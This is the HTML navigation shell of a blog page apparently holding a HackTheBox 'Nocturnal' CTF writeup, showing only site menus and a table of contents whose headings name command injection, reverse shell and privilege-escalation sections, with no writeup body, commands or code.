
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
        <meta name="author" content="ch3ckm8">
      
      
        <link rel="canonical" href="https://ch3ckm8.github.io/personal_blog4/ch3ckm8_HTB_Nocturnal/">
      
      
        <link rel="prev" href="../ch3ckm8_HTB_EscapeTwo/">
      
      
        <link rel="next" href="../ch3ckm8_HTB_Return/">
      
      
      <link rel="icon" href="../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.18">
    
    
      
        <title>Nocturnal - Ch3ckm8 Vault</title>
      
    
    
      <link rel="stylesheet" href="../assets/stylesheets/main.7e37652d.min.css">
      
        
        <link rel="stylesheet" href="../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
      <link rel="stylesheet" href="../assets/stylesheets/interactive_graph.css">
    
      <link rel="stylesheet" href="../assets/stylesheets/obsidian_tags.css">
    
      <link rel="stylesheet" href="../assets/stylesheets/custom.css">
    
    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#intro" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href=".." title="Ch3ckm8 Vault" class="md-header__button md-logo" aria-label="Ch3ckm8 Vault" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 22H5v-2h14zM13 2c-1.25 0-2.42.62-3.11 1.66L7 8l2 2 2.06-1.37c.44-.31 1.08-.19 1.39.27.02.03.05.06.05.1.3.59.19 1.3-.28 1.77l-4.8 4.8c-.55.56-.55 1.46.01 2.01.26.26.62.42.99.42H17V6a4 4 0 0 0-4-4"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            Ch3ckm8 Vault
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Nocturnal
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      
      
        <label class="md-header__button md-icon" for="__search">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        </label>
        <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
      
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
            
<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
  <div class="md-grid">
    <ul class="md-tabs__list">
      
        
  
  
  
  
    <li class="md-tabs__item">
      <a href=".." class="md-tabs__link">
        
  
  
    
  
  Welcome

      </a>
    </li>
  

      
        
  
  
  
    
  
  
    
    
      <li class="md-tabs__item md-tabs__item--active">
        <a href="../ch3ckm8_HTB_Active/" class="md-tabs__link">
          
  
  
  HTB Writeups

        </a>
      </li>
    
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../ch3ckm8_RoboGRoot-CTF_Portfolio/" class="md-tabs__link">
          
  
  
  Other CTF Writeups

        </a>
      </li>
    
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../common_tools/" class="md-tabs__link">
          
  
  
  Notes

        </a>
      </li>
    
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../windows/" class="md-tabs__link">
          
  
  
  Tags

        </a>
      </li>
    
  

      
    </ul>
  </div>
</nav>
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


  


<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href=".." title="Ch3ckm8 Vault" class="md-nav__button md-logo" aria-label="Ch3ckm8 Vault" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 22H5v-2h14zM13 2c-1.25 0-2.42.62-3.11 1.66L7 8l2 2 2.06-1.37c.44-.31 1.08-.19 1.39.27.02.03.05.06.05.1.3.59.19 1.3-.28 1.77l-4.8 4.8c-.55.56-.55 1.46.01 2.01.26.26.62.42.99.42H17V6a4 4 0 0 0-4-4"/></svg>

    </a>
    Ch3ckm8 Vault
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href=".." class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Welcome
    
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
    
    
      
        
        
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
        
          
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
            
  
  
  <span class="md-ellipsis">
    HTB Writeups
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            HTB Writeups
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_Active/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Active
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_Administrator/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Administrator
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_Blackfield/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Blackfield
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_Cascade/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Cascade
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_EscapeTwo/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    EscapeTwo
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  
  <span class="md-ellipsis">
    Nocturnal
    
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  
  <span class="md-ellipsis">
    Nocturnal
    
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#intro" class="md-nav__link">
    <span class="md-ellipsis">
      Intro
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#reconnaissance" class="md-nav__link">
    <span class="md-ellipsis">
      Reconnaissance
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Reconnaissance">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#directory-and-subdomain-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      Directory and subdomain enumeration
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#foothold" class="md-nav__link">
    <span class="md-ellipsis">
      Foothold
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Foothold">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#user-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      User enumeration
    </span>
  </a>
  
    <nav class="md-nav" aria-label="User enumeration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#why-it-works" class="md-nav__link">
    <span class="md-ellipsis">
      Why it works:
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#why-also-cleanentry-is-not-enough" class="md-nav__link">
    <span class="md-ellipsis">
      Why also cleanEntry() is not enough:
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#command-injection-testing" class="md-nav__link">
    <span class="md-ellipsis">
      Command injection: testing
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#command-injection-rev-shell-upload" class="md-nav__link">
    <span class="md-ellipsis">
      Command injection: rev shell: upload
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#command-injection-rev-shell-execution" class="md-nav__link">
    <span class="md-ellipsis">
      Command injection: rev shell: execution
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#privesc" class="md-nav__link">
    <span class="md-ellipsis">
      Privesc
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Privesc">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#port-forwarding" class="md-nav__link">
    <span class="md-ellipsis">
      Port forwarding
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#summary" class="md-nav__link">
    <span class="md-ellipsis">
      Summary
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Summary">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#reconnaissance_1" class="md-nav__link">
    <span class="md-ellipsis">
      Reconnaissance
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#foothold_1" class="md-nav__link">
    <span class="md-ellipsis">
      Foothold
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#privesc_1" class="md-nav__link">
    <span class="md-ellipsis">
      Privesc
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#sidenotes" class="md-nav__link">
    <span class="md-ellipsis">
      Sidenotes
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_Return/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Return
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_TheFrizz/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    TheFrizz
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_forest/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Forest
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_monteverde/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Monteverde
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_sauna/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Sauna
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_Timelapse/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Timelapse
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_cicada/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Cicada
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_Escape/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Escape
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_Flight/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Flight
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_fluffy/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Fluffy
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_puppy/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Puppy
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_tombwatcher/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Tombwatcher
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_certified/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Certified
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Other CTF Writeups
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            Other CTF Writeups
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_RoboGRoot-CTF_Portfolio/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    RoboGRoot's-Portfolio
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
        
          
          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Notes
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4">
            <span class="md-nav__icon md-icon"></span>
            Notes
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../common_tools/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Commonly used tools and methodologies
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
        
          
          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Tags
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5">
            <span class="md-nav__icon md-icon"></span>
            Tags
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../windows/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    windows
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../AD/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    AD
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ADconnectAbuse/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    ADconnectAbuse
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../AS-REP-roasting/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    AS-REP-roasting
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../AssumedBreach/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    AssumedBreach
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../DCSync/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    DCSync
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Docker/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Docker
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../GSSAPIauthentication/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    GSSAPIauthentication
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Kerberoasting/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Kerberoasting
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../NotAssumedBreach/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    NotAssumedBreach
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OSCPpath/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    OSCPpath
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../PortForwarding/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    PortForwarding
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../PrivGroupAbuse/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    PrivGroupAbuse
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../RCE/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    RCE
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../RecycleBin/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    RecycleBin
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../WebApp/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    WebApp
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../WinPEAS/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    WinPEAS
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../XSS/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    XSS
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../certificates/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    certificates
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../certvulntemplate/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    certvulntemplate
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../codereview/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    codereview
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../commandinjection/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    commandinjection
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../gpo/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    gpo
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../linux/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    linux
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../history/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    history
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../laps/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    LAPS
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../mssql/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    mssql
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../certvulntoESC1/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    certvulntoESC1
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../certvulntoESC9/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    certvulntoESC9
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Impersonation/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Impersonation
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Vhosts/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Vhosts
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../certvulntoESC16/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    certvulntoESC16
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../certvulntoESC15/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    certvulntoESC15
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../shadowcredential/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    shadowcredential
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ADdisabledaccount/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    ADdisabledaccount
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
